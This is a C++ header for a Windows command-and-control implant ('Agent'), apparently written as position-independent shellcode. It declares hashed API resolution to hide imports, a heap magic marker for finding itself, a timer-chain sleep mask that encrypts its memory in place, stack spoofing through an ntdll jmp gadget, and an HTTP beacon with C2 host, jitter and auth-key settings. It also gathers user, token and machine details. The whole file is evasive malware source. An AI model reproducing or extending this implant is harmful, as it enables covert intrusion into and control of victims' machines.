#ifndef AGENT_H
#define AGENT_H

#include <windows.h>
#include <stdint.h>
#include <Native.h>
#include <LdrLoad.h>
#include <Hash.h>
#include <wininet.h>

// Magic value stored inside the agent we use to find it by scanning PEB heaps
#define AGENT_HEAP_MAGIC 0xC0DED00DC0FFEE

// DECLAPI declares a typed function pointer matching the real Windows function
// for example : DECLAPI(NtAllocateVirtualMemory) expands to:
                //  decltype(NtAllocateVirtualMemory)* NtAllocateVirtualMemory
#define DECLAPI(x) decltype(x)* x

// RSL_TYPE stores the hash of the function name into the pointer slot at complie time
// LdrLoad will later replace those hashes with real addresss
#define RSL_TYPE(x) .x = (decltype(x)*) (Hash::Str( #x ))

// One node per tracked heap allocation
struct HEAP_NODE {
    PVOID       Address; // pointer to the allocation
    SIZE_T      Size;    // size in bytes
    HEAP_NODE*  Next;    // next node in the list
};


namespace Root
{
    class Agent
    {
        public:
        // G_AGENT scans ProcessHeaps looking for this exact value    
        uint64_t MagicValue = AGENT_HEAP_MAGIC;

        // where in memory the shellcode lives
        struct{
            ULONG_PTR Start;    // = StartPtr() at runtime
            ULONG_PTR Length;   // = EndPtr() - Start
        } Base = {};

        // per-session state
        struct{
            PCHAR      AgentID;
            ULONG      ProcessID;
            ULONG      ThreadID;
            ULONG      ParentID;
            PCHAR      ImagePath;
            PCHAR      CommandLine;
            BOOL       Elevated;
            ULONG_PTR  HeapHandle; // handle to our custom heap
            BOOL       Connected;
            BOOL       Authenticated; // TRUE after first auth check-in succeeds
        } Session = {};

        // ntdll.dll - first DLL resolved (needed before anything else)
        struct{
            ULONG_PTR Handle;

            DECLAPI( RtlAllocateHeap );
            DECLAPI( RtlReAllocateHeap );
            DECLAPI( RtlFreeHeap       );
            DECLAPI( RtlCreateHeap     );
            DECLAPI( NtAllocateVirtualMemory );
            DECLAPI( NtFreeVirtualMemory     );
            DECLAPI( NtProtectVirtualMemory  );
            DECLAPI( DbgPrint );
            DECLAPI( RtlGetVersion );
            DECLAPI( NtCreateEvent           );
            DECLAPI( NtWaitForSingleObject    );
            DECLAPI( NtSetEvent              );
            DECLAPI( RtlCreateTimerQueueTimer );
            DECLAPI( RtlDeleteTimerQueueTimer );
            // timer chain (sleep mask)
            DECLAPI( RtlCreateTimerQueue             );
            DECLAPI( RtlCreateTimer                  );
            DECLAPI( RtlDeleteTimer                  );
            DECLAPI( RtlDeleteTimerQueue             );
            DECLAPI( RtlCaptureContext               );
            DECLAPI( NtSignalAndWaitForSingleObject  );
            DECLAPI( NtContinue                      );
            DECLAPI( NtClose                         );
            // stack spoofing
            DECLAPI( NtGetContextThread              );
            DECLAPI( NtSetContextThread              );
        } Ntdll = {
            RSL_TYPE( RtlAllocateHeap   ),
            RSL_TYPE( RtlReAllocateHeap ),
            RSL_TYPE( RtlFreeHeap       ),
            RSL_TYPE( RtlCreateHeap     ),
            RSL_TYPE( NtAllocateVirtualMemory ),
            RSL_TYPE( NtFreeVirtualMemory     ),
            RSL_TYPE( NtProtectVirtualMemory  ),
            RSL_TYPE( DbgPrint ),
            RSL_TYPE( RtlGetVersion ),
            RSL_TYPE( NtCreateEvent           ),
            RSL_TYPE( NtWaitForSingleObject    ),
            RSL_TYPE( NtSetEvent              ),
            RSL_TYPE( RtlCreateTimerQueueTimer ),
            RSL_TYPE( RtlDeleteTimerQueueTimer ),
            RSL_TYPE( RtlCreateTimerQueue            ),
            RSL_TYPE( RtlCreateTimer                 ),
            RSL_TYPE( RtlDeleteTimer                 ),
            RSL_TYPE( RtlDeleteTimerQueue            ),
            RSL_TYPE( RtlCaptureContext              ),
            RSL_TYPE( NtSignalAndWaitForSingleObject ),
            RSL_TYPE( NtContinue                     ),
            RSL_TYPE( NtClose                        ),
            RSL_TYPE( NtGetContextThread             ),
            RSL_TYPE( NtSetContextThread             ),
        };

        // kernel32.dll
        struct {
            ULONG_PTR Handle;

            DECLAPI( LoadLibraryA    );
            DECLAPI( GetProcAddress  );
            DECLAPI( VirtualAlloc    );
            DECLAPI( VirtualFree     );
            DECLAPI( VirtualProtect  );
            DECLAPI( Sleep           );
            DECLAPI( CreateThread    );
            DECLAPI( GetComputerNameA   );
            DECLAPI( GetCurrentProcessId );
            DECLAPI( GetCurrentThreadId  );
            DECLAPI( CreateProcessA        );
            DECLAPI( WaitForSingleObject   );
            DECLAPI( CloseHandle           );
            DECLAPI( ReadFile              );
            DECLAPI( WriteFile             );
            DECLAPI( CreatePipe            );
            DECLAPI( GetCurrentDirectoryA  );
            DECLAPI( FindFirstFileA        );
            DECLAPI( FindNextFileA         );
            DECLAPI( FindClose             );
            DECLAPI( TerminateProcess      );
            // sleep mask
            DECLAPI( WaitForSingleObjectEx );
            DECLAPI( SetEvent              );
            // stack spoofing
            DECLAPI( DuplicateHandle       );
        } Krnl32 = {
            RSL_TYPE( LoadLibraryA   ),
            RSL_TYPE( GetProcAddress ),
            RSL_TYPE( VirtualAlloc   ),
            RSL_TYPE( VirtualFree    ),
            RSL_TYPE( VirtualProtect ),
            RSL_TYPE( Sleep          ),
            RSL_TYPE( CreateThread   ),
            RSL_TYPE( GetComputerNameA   ),
            RSL_TYPE( GetCurrentProcessId ),
            RSL_TYPE( GetCurrentThreadId  ),
            RSL_TYPE( CreateProcessA        ),
            RSL_TYPE( WaitForSingleObject   ),
            RSL_TYPE( CloseHandle          ),
            RSL_TYPE( ReadFile             ),
            RSL_TYPE( WriteFile            ),
            RSL_TYPE( CreatePipe           ),
            RSL_TYPE( GetCurrentDirectoryA ),
            RSL_TYPE( FindFirstFileA       ),
            RSL_TYPE( FindNextFileA        ),
            RSL_TYPE( FindClose            ),
            RSL_TYPE( TerminateProcess     ),
            RSL_TYPE( WaitForSingleObjectEx ),
            RSL_TYPE( SetEvent              ),
            RSL_TYPE( DuplicateHandle       ),
        };

        struct {
            PVOID      Handle;       // heap handle
            HEAP_NODE* Head;         // head of the tracked allocation list
        } Hp = {};

                // advapi32.dll - user/token APIs
        struct {
            ULONG_PTR Handle;

            DECLAPI( GetUserNameA );
            DECLAPI( OpenProcessToken );
            DECLAPI( GetTokenInformation );
        } Advapi32 = {
            RSL_TYPE( GetUserNameA ),
            RSL_TYPE( OpenProcessToken ),
            RSL_TYPE( GetTokenInformation ),
        };

        // wininet.dll - HTTP transport
        struct {
            ULONG_PTR Handle;

            DECLAPI( InternetOpenW       );
            DECLAPI( InternetConnectW    );
            DECLAPI( HttpOpenRequestW    );
            DECLAPI( HttpSendRequestW    );
            DECLAPI( InternetReadFile    );
            DECLAPI( InternetCloseHandle );
            DECLAPI( InternetSetOptionA  );

            // Persistent session handles - created once, reused for all requests.
            // Re-creating per-request on Windows 11 causes a TppWorkerThread race:
            // cleanup threads from InternetCloseHandle are still running when the
            // next HttpSendRequestW spawns a new thread, corrupting WinInet internals.
            PVOID InetSession; // InternetOpenW handle
            PVOID InetConnect; // InternetConnectW handle
        } WinInet = {
            RSL_TYPE( InternetOpenW       ),
            RSL_TYPE( InternetConnectW    ),
            RSL_TYPE( HttpOpenRequestW    ),
            RSL_TYPE( HttpSendRequestW    ),
            RSL_TYPE( InternetReadFile    ),
            RSL_TYPE( InternetCloseHandle ),
            RSL_TYPE( InternetSetOptionA  ),
        };

        // cryptbase.dll - in-place memory encryption (SystemFunction040/041 = RtlEncryptMemory/Decrypt)
        struct {
            ULONG_PTR Handle;
            DECLAPI( SystemFunction040 );
            DECLAPI( SystemFunction041 );
        } Cryptbase = {
            RSL_TYPE( SystemFunction040 ),
            RSL_TYPE( SystemFunction041 ),
        };

        // C2 config - populated in Init() from build-time Config.cc data
        struct {
            PCHAR  Host;       // C2 hostname
            UINT16 Port;       // C2 port
            BOOL   Ssl;        // HTTPS?
            PCHAR  UserAgent;  // HTTP user-agent string
            ULONG  Sleep;      // sleep interval (seconds)
            ULONG  Jitter;     // jitter percentage
            PCHAR  AgentUUID;  // 36-char unique ID
            PVOID  JmpGadget;         // address of `jmp [rbx]` (FF 23) inside ntdll .text
            HANDLE MainThreadHandle;  // real handle to main thread (for stack spoofing)
            UINT32 AuthMode;   // 0=none, 1=cmd (persistent), 2=otk (one-time)
            PBYTE  AuthKey;    // 16 raw bytes decoded from PAIN_AUTH_KEY hex
        } Config = {};

        // machine info - collected in Init()
        struct {
            PCHAR Username;
            PCHAR Computer;
            PCHAR ProcessName;  // basename of ImagePathName from PEB
            ULONG OsMajor;
            ULONG OsMinor;
            ULONG OsBuild;
            BOOL  Elevated;
        } Machine = {};


        // constructor - resolves base address and core API's
        // declaration of the Agent.cc
        explicit Agent();

        auto Init() -> void;    // resolve remaining API's, collect machine info
        auto Start() -> void;   // checkin + main beacon loop
    };
}

// G_AGENT macro - retrieve the agent pointer from TEB.ArbitraryUserPointer (+0x28).
// Main() stores it there; all shellcode execution happens on the beacon thread so
// the TEB lookup is always valid. Timer-chain callbacks call NtContinue directly
// and never invoke G_AGENT, so no cross-thread lookup is needed.
#define G_AGENT \
    Root::Agent* Self = (Root::Agent*)NtCurrentTeb()->ArbitraryUserPointer;

#endif